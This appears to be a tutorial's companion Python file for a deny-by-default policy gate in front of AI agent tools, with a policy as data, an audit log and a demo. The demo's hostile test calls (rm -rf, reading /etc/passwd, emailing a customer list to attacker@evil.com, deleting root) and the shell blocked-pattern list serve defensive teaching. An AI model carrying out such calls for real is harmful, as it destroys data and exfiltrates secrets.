"""policy_gate.py - a deny-by-default policy gate for AI agent tool calls.

Companion code for the tutorial "Put a Policy Gate in Front of Your AI
Agent's Tools" (https://anushamukka.com/posts/put-a-policy-gate-in-front-of-your-ai-agent/).

The whole design: a policy written as plain data, a check_call(tool, args)
function that returns an allow-or-deny decision with a reason, a single
dispatch() choke point that every tool call goes through, and an audit log
recording every decision as a JSON line.

Standard library only. The gate should be the easiest part of your agent
to read, not another dependency to audit.
"""

import json
import re
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# Step 2: the policy, as data.
#
# Read it in one screen; change it without touching logic. Anything not
# listed here does not exist as far as the gate is concerned: there is no
# "delete_user" entry, so a call to one is denied. That is deny by default,
# the single most important property of this file.
# ---------------------------------------------------------------------------
POLICY = {
    "read_file": {
        "allowed_prefixes": ["/tmp/work/"],
    },
    "run_shell": {
        "allowed_commands": ["ls", "cat", "wc", "head", "tail", "grep"],
        "blocked_patterns": [
            r"\brm\s+-rf\b",
            r";",
            r"&&",
            r"\|\|",
            r"`",
            r"\$\(",
        ],
        "allowed_prefixes": ["/tmp/work/"],
    },
    "send_email": {
        "allowed_recipients": [r".*@internal\.example\.com$"],
    },
}

# ---------------------------------------------------------------------------
# Step 1: the toy agent's tools (stubs) and registry.
#
# In a real agent these would do real work (subprocess, SMTP, filesystem).
# The gate does not care: it sits between the decision and the execution.
# ---------------------------------------------------------------------------

def tool_read_file(args):
    return "contents of %s (stubbed)" % args["path"]


def tool_run_shell(args):
    return "stub: would run: %s" % args["command"]


def tool_send_email(args):
    return "stub: email to %s with subject '%s'" % (
        args["to"],
        args.get("subject", ""),
    )


TOOLS = {
    "read_file": tool_read_file,
    "run_shell": tool_run_shell,
    "send_email": tool_send_email,
}


# ---------------------------------------------------------------------------
# Step 3: the gate. Returns (allowed, reason). Unknown tools are denied.
#
# The gate never throws: a missing argument or an unknown tool produces a
# deny with a reason, not an exception, because the dispatch path must
# always get an answer.
# ---------------------------------------------------------------------------

def _path_ok(path, prefixes):
    if not isinstance(path, str):
        return False
    # The directory itself must match too, not just paths inside it.
    # The rstrip keeps /tmp/workevil from sneaking past a /tmp/work/ prefix.
    return any(
        path == p.rstrip("/") or path.startswith(p) for p in prefixes
    )


def check_call(tool, args):
    args = args or {}
    if tool not in POLICY:
        return False, "unknown tool '%s'" % tool

    if tool == "read_file":
        path = args.get("path", "")
        if _path_ok(path, POLICY["read_file"]["allowed_prefixes"]):
            return True, "path is inside an allowed prefix"
        return False, "path '%s' is outside allowed prefixes" % path

    if tool == "run_shell":
        cmd = args.get("command", "")
        for pattern in POLICY["run_shell"]["blocked_patterns"]:
            if re.search(pattern, cmd):
                return False, "blocked pattern matched: %s" % pattern
        first = cmd.split()[0] if cmd.split() else ""
        if first not in POLICY["run_shell"]["allowed_commands"]:
            return False, "command '%s' is not allowlisted" % first
        for token in cmd.split():
            if token.startswith("/") and not _path_ok(
                token, POLICY["run_shell"]["allowed_prefixes"]
            ):
                return False, "path '%s' is outside allowed prefixes" % token
        return True, "command allowlisted, args inside /tmp/work/"

    if tool == "send_email":
        to = args.get("to", "")
        for pattern in POLICY["send_email"]["allowed_recipients"]:
            if re.match(pattern, to):
                return True, "recipient domain is allowlisted"
        return False, "recipient '%s' is not allowlisted" % to

    return False, "no rule matched"


# ---------------------------------------------------------------------------
# Step 4: the dispatch path. There is exactly one way to reach a tool,
# and it goes through the gate. No tool executes without a policy decision.
# ---------------------------------------------------------------------------

def dispatch(tool, args):
    allowed, reason = check_call(tool, args)
    log_decision(tool, args, allowed, reason)
    if not allowed:
        return "DENIED: %s" % reason
    return TOOLS[tool](args)


# ---------------------------------------------------------------------------
# Step 5: the audit log. Every decision, allow or deny, lands here as one
# JSON line. The log records the decision and the reason, not just the
# outcome: "denied" tells you nothing six weeks later; "denied, recipient
# not allowlisted" tells you the policy worked. Timestamps are UTC, ISO
# formatted. Local timezones in audit logs are how you lose an afternoon
# to an off-by-five-hours mystery.
# ---------------------------------------------------------------------------

AUDIT_LOG = []


def log_decision(tool, args, allowed, reason):
    AUDIT_LOG.append(
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "tool": tool,
            "args": args,
            "decision": "allow" if allowed else "deny",
            "reason": reason,
        }
    )


def flush_audit(path="audit.log"):
    with open(path, "w") as f:
        for entry in AUDIT_LOG:
            f.write(json.dumps(entry) + "\n")


# ---------------------------------------------------------------------------
# Step 6: the demo. Three benign calls, then four calls that should never
# run. Run with: python3 policy_gate.py
# ---------------------------------------------------------------------------

def _summarize(args):
    return " ".join("%s=%s" % (k, v) for k, v in args.items())


def demo():
    calls = [
        ("read_file", {"path": "/tmp/work/notes.txt"}),
        ("run_shell", {"command": "ls /tmp/work"}),
        (
            "send_email",
            {
                "to": "teammate@internal.example.com",
                "subject": "deploy notes",
                "body": "all green",
            },
        ),
        ("run_shell", {"command": "rm -rf /tmp/work"}),
        ("read_file", {"path": "/etc/passwd"}),
        (
            "send_email",
            {
                "to": "attacker@evil.com",
                "subject": "exfil",
                "body": "customer list",
            },
        ),
        ("delete_user", {"id": "root"}),
    ]
    for tool, args in calls:
        allowed, reason = check_call(tool, args)
        print(
            "[%s] %s(%s): %s"
            % ("ALLOW" if allowed else "DENY", tool, _summarize(args), reason)
        )
        print("  ->", dispatch(tool, args))
    flush_audit()
    print("wrote %d decisions to audit.log" % len(AUDIT_LOG))


if __name__ == "__main__":
    demo()
